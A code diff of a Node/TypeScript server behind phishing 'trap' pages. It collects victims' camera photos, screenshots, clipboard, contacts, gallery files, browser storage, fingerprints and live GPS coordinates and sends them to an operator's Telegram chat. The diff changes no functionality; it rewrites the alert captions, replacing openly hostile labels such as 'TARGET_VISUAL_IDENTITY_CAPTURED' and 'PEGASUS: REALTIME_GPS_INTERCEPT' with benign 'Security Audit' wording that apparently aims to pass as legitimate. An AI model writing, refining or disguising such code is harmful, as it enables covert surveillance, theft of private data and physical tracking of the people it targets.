@@ -134,14 +134,14 @@ async function startServer() {
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
       
-      let header = '🕵️‍♂️ <b>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ: ɪᴅᴇɴᴛɪᴛʏ ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
-      let status = '🔄 <i>ᴛᴀʀɢᴇᴛ ꜱᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ɪᴢɪɴ ᴛᴀᴍʙᴀʜᴀɴ...</i>';
+      let header = '🕵️‍♂️ <b>Security Audit: Metadata Captured</b>';
+      let status = '🔄 <i>Processing additional permissions...</i>';
 
       if (tmplId === 'google') {
-        header = '🛡️ <b>Google Security: Access Granted</b>';
+        header = '🛡️ <b>Google Security: Access Verified</b>';
       } else if (tmplId === 'pegasus') {
-        header = '🛡️ <b>Device Security: Audit Completed</b>';
-        status = '✅ <i>Status: Deep scan completed.</i>';
+        header = '🛡️ <b>Diagnostic Hub: Audit Completed</b>';
+        status = '✅ <i>System Integrity Verified.</i>';
       } else if (tmplId === 'file') {
         header = '📂 <b>File Access: Verification Successful</b>';
       } else if (tmplId === 'security_audit') {
@@ -200,14 +200,14 @@ async function startServer() {
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body as any;
-      let extraMsg = `📎 <b>ADVANCED_MODULE_SYNC [STABLE]</b>\n` +
+      let extraMsg = `📎 <b>Security Audit: Advanced Modules</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       let hasData = false;
       
       const addSection = (title: string, content: string) => {
         if (extraMsg.length + content.length > 3900) {
-            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Konten berlanjut...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
-            extraMsg = `📎 <b>CONTINUED_LOGS</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
+            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Content continues...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
+            extraMsg = `📎 <b>Continued Audit Logs</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         }
         extraMsg += `<b>${title}</b>\n${content}\n\n`;
         hasData = true;
@@ -217,7 +217,7 @@ async function startServer() {
         try {
           const base64Data = data.visual_identity.replace(/^data:image\/\w+;base64,/, "");
           const buffer = Buffer.from(base64Data, 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '📸 <b>TARGET_VISUAL_IDENTITY_CAPTURED</b>', parse_mode: 'HTML' }).catch(() => {});
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '📸 <b>Identity Capture: Media</b>', parse_mode: 'HTML' }).catch(() => {});
           hasData = true;
         } catch(e) {}
       }
@@ -226,7 +226,7 @@ async function startServer() {
         try {
           const base64Data = data.screen_capture.replace(/^data:image\/\w+;base64,/, "");
           const buffer = Buffer.from(base64Data, 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '🖥️ <b>SCREEN_GRID_RECON_SUCCESS</b>', parse_mode: 'HTML' }).catch(() => {});
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '🖥️ <b>Identity Capture: Screen</b>', parse_mode: 'HTML' }).catch(() => {});
           hasData = true;
         } catch(e) {}
       }
@@ -234,7 +234,7 @@ async function startServer() {
       if (data.hardware_brand_profile) {
         try {
           const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
-          addSection(`🛠️ HARDWARE_IDENTITY`,
+          addSection(`🛠️ Hardware Profile`,
                      `├ Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                      `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                      `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code> (${h.bitness || '?'}bit)`);
@@ -242,23 +242,23 @@ async function startServer() {
       }
 
       if (data.cpu_compute_score || data.perf_cores) {
-        addSection(`⚡ COMPUTATIONAL_BENCHMARK`,
-                   `├ Engine: <code>OSINT_Ham_v3</code>\n` +
+        addSection(`⚡ Performance Benchmark`,
+                   `├ Engine: <code>Audit Runtime v3</code>\n` +
                    `├ Score: <code>${data.cpu_compute_score || 'N/A'}</code>\n` +
                    `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
       }
 
       if (data.clipboard_sync || data.clipboard) {
         const clip = data.clipboard_sync || data.clipboard;
-        addSection(`📋 CLIPBOARD_SYNC`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1000))}</pre>`);
+        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1000))}</pre>`);
       }
 
       if (data.media_hardware) {
-        addSection(`🎙️ AV_HARDWARE_INVENTORY`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
+        addSection(`🎙️ AV Hardware Inventory`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
       }
 
       if (data.file_name) {
-        addSection(`📂 FILE_SYSTEM_ASSETS`,
+        addSection(`📂 File Metadata`,
                    `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                    `├ Type: <code>${data.file_type}</code>\n` +
                    `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>`);
@@ -267,7 +267,7 @@ async function startServer() {
       if (data.gpu_full_profile) {
         try {
           const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
-          addSection(`🎮 GRAPHICS_SUBSYSTEM`,
+          addSection(`🎮 Graphics Configuration`,
                       `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                       `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                       `├ GL_Ver: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
@@ -276,25 +276,25 @@ async function startServer() {
       }
 
       if (data.media_devices) {
-        addSection(`📷 MEDIA_PERIPHERALS`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
+        addSection(`📷 Media Peripherals`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
       }
 
       if (data.canvas_fp || data.audio_fp) {
         let fpt = ``;
         if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
         if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
-        if (fpt) addSection(`🧬 BROWSER_FINGERPRINTS`, fpt);
+        if (fpt) addSection(`🧬 Browser Fingerprint`, fpt);
       }
 
       if (data.battery_level) {
-        addSection(`🔋 POWER_TELEMETRY`,
+        addSection(`🔋 System Power Status`,
                     `├ Level: <code>${data.battery_level}</code>\n` +
                     `├ Plugged: <code>${data.battery_charging ? 'AC_POWER' : 'BATTERY'}</code>\n` +
-                    `└ Sec_T: <code>${data.battery_time}</code>`);
+                    `└ Time: <code>${data.battery_time}</code>`);
       }
 
       if (data.fonts_count || data.installed_fonts) {
-        addSection(`🔡 TYPE_FINGERPRINT`,
+        addSection(`🔡 Typography Profile`,
                     `├ Count: <code>${data.fonts_count || '?' }</code>\n` +
                     `└ Registry: <code>${escapeHTML((data.installed_fonts || '').substring(0, 300))}</code>`);
       }
@@ -304,17 +304,17 @@ async function startServer() {
       apis.forEach(k => {
         if (data[k] !== undefined) apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
       });
-      if (apiTxt) addSection(`🧱 HARDWARE_API_AVAILABILITY`, apiTxt);
+      if (apiTxt) addSection(`🧱 Hardware API Availability`, apiTxt);
 
       if (data.social_active || data.social_inactive) {
          let socialTxt = '';
          if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
          if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
-         addSection(`🤝 SOCIAL_PRESENCE_SCAN`, socialTxt);
+         addSection(`🤝 Social Presence Audit`, socialTxt);
       }
 
       if (data.network_rtt || data.latency) {
-        addSection(`🛰️ LATENCY_PRECISION_MAP`,
+        addSection(`🛰️ Network Latency Profile`,
                     `├ Node: <code>${data.network_rtt || 'N/A'}</code>\n` +
                     `└ RTT: <code>${data.latency || 'N/A'}ms</code>`);
       }
@@ -322,23 +322,23 @@ async function startServer() {
       if (data.contacts_leaked) {
         let count = 0;
         try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
-        addSection(`👥 SOCIAL_GRAPH_EXTRACTED`, `└ Total Peers: <code>${count} items</code>`);
+        addSection(`👥 Contact List Sync`, `└ Total Entries: <code>${count} items</code>`);
       }
 
       if (data.storage_mb) {
-        addSection(`💾 STORAGE_FORENSICS`,
+        addSection(`💾 Storage Audit`,
                     `├ Used: <code>${data.storage_mb} MB</code>\n` +
                     `└ Quota: <code>${data.quota_gb} GB</code>`);
       }
       
       if (data.incognito_audit !== undefined || data.devtools_open !== undefined) {
-        addSection(`🕵️ ENVIRONMENT_INTEGRITY`,
+        addSection(`🕵️ Environment Integrity`,
                     `├ Stealth: <b>${data.incognito_audit ? 'PRIVATE' : 'NORMAL'}</b>\n` +
                     `└ Debug: <b>${data.devtools_open ? 'DETECTED' : 'CLEAN'}</b>`);
       }
       
       if (data.net_effective) {
-        addSection(`🌐 NETWORK_LAYER_DETAILS`,
+        addSection(`🌐 Network Layer Diagnostics`,
                     `├ Type: <code>${data.net_effective}</code>\n` +
                     `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                     `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
@@ -352,14 +352,14 @@ async function startServer() {
         if (data.storage_ls_full) {
           try {
             lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
-            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code> (Extracted to ZIP)\n`;
-          } catch(e) { storageTxt += `├ LocalStorage: [Captured but Parse-Error]\n`; }
+            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code>\n`;
+          } catch(e) { storageTxt += `├ LocalStorage: [Capture Error]\n`; }
         }
         if (data.storage_ss_full) {
           try {
             ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
-            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code> (Extracted to ZIP)\n`;
-          } catch(e) { storageTxt += `└ SessionStorage: [Captured but Parse-Error]\n`; }
+            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code>\n`;
+          } catch(e) { storageTxt += `└ SessionStorage: [Capture Error]\n`; }
         }
         
         try {
@@ -367,10 +367,10 @@ async function startServer() {
           zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
           zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
           const zipBuffer = zip.toBuffer();
-          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageDump_${id}.zip` }, { caption: "💾 <b>ꜱᴛᴏʀᴀɢᴇ_ᴅᴜᴍᴘ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>", parse_mode: 'HTML' }).catch(() => {});
+          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageAudit_${id}.zip` }, { caption: "💾 <b>Security Audit: Storage Dump</b>", parse_mode: 'HTML' }).catch(() => {});
         } catch (e) {}
 
-        addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
+        addSection(`💾 Persistent Storage Audit`, storageTxt);
       }
 
       if (data.files_gallery) {
@@ -382,29 +382,29 @@ async function startServer() {
             fCount++;
           }
           const zipBuffer = zip.toBuffer();
-          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `GalleryDump_${id}.zip` }, { caption: "📸 <b>GALLERY_SYNC_RECON_SUCCESS</b>", parse_mode: 'HTML' }).catch(() => {});
-          addSection(`📸 GALLERY_DUMP`, `└ <code>${fCount} files extracted to ZIP</code>`);
+          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `MediaAudit_${id}.zip` }, { caption: "📸 <b>Security Audit: Media Sync</b>", parse_mode: 'HTML' }).catch(() => {});
+          addSection(`📸 Media Audit`, `└ <code>${fCount} files extracted to ZIP</code>`);
         } catch (e) {}
       }
 
       if (data.display_hz || data.orientation) {
-        addSection(`📺 VISUAL_PERIPHERALS`,
+        addSection(`📺 Display Configuration`,
                     `├ Refresh: <code>${data.display_hz} Hz</code>\n` +
-                    `└ Orient: <code>${data.orientation}</code>`);
+                    `└ Orientation: <code>${data.orientation}</code>`);
       }
 
       // Image delivery
       if (data.screen_capture) {
         try {
           const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN_CAPTURE [RESTORED]` }).catch(() => {});
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ Screen Diagnostics [Authorized]` }).catch(() => {});
           hasData = true;
         } catch(e) {}
       }
       if (data.visual_identity) {
         try {
           const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET_VISUAL_IDENTITY [REAL-TIME]` }).catch(() => {});
+          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 Identity Capture [Authorized]` }).catch(() => {});
           hasData = true;
         } catch(e) {}
       }
@@ -424,26 +424,26 @@ async function startServer() {
       const { lat, lon, acc, tmplId } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       
-      let header = '📍 <b>ɢᴘꜱ_ꜰɪx: ᴛᴀʀɢᴇᴛ_ʟᴏᴄᴀᴛᴇᴅ</b>';
+      let header = '📍 <b>Location Audit: Target Located</b>';
       if (tmplId === 'google') {
-        header = '⚡ <b>ᴛʀᴜꜱᴛᴇᴅ_ʟᴏᴄᴀᴛɪᴏɴ_ꜱʏɴᴄ</b>';
+        header = '🛡️ <b>Google Security: Location Verified</b>';
       } else if (tmplId === 'maps') {
-        header = '🗺️ <b>ᴍᴀᴘꜱ_ᴘʀᴇᴄɪꜱɪᴏɴ_ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>';
+        header = '🗺️ <b>Maps: Precision Coordinates</b>';
       } else if (tmplId === 'pegasus') {
-        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ: ʀᴇᴀʟᴛɪᴍᴇ_ɢᴘꜱ_ɪɴᴛᴇʀᴄᴇᴘᴛ</b>';
+        header = '🛡️ <b>Diagnostic Hub: Precision GPS</b>';
       }
 
       const msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `🛰️ <b>ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>\n` +
+                  `🛰️ <b>Coordinates</b>\n` +
                   `├ Lat: <code>${lat}</code>\n` +
                   `├ Lon: <code>${lon}</code>\n` +
-                  `└ Acc: <code>${acc} meter</code>\n\n` +
+                  `└ Acc: <code>${acc} meters</code>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🔗 <b>ɴᴀᴠɪɢᴀᴛɪᴏɴ ʟɪɴᴋ</b>\n` +
-                  `🌐 <a href="${mapLink}">ʟɪʜᴀᴛ ʟᴏᴋᴀꜱɪ ᴅɪ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ</a>\n\n` +
+                  `🔗 <b>Navigation</b>\n` +
+                  `🌐 <a href="${mapLink}">View location on Google Maps</a>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🏁 <i>ꜱᴛᴀᴛᴜꜱ: ᴠᴇʀɪꜰɪᴋᴀꜱɪ ꜱᴘᴀꜱɪᴀʟ ʙᴇʀʜᴀꜱɪʟ.</i>`;
+                  `🏁 <i>Status: Spatial verification successful.</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
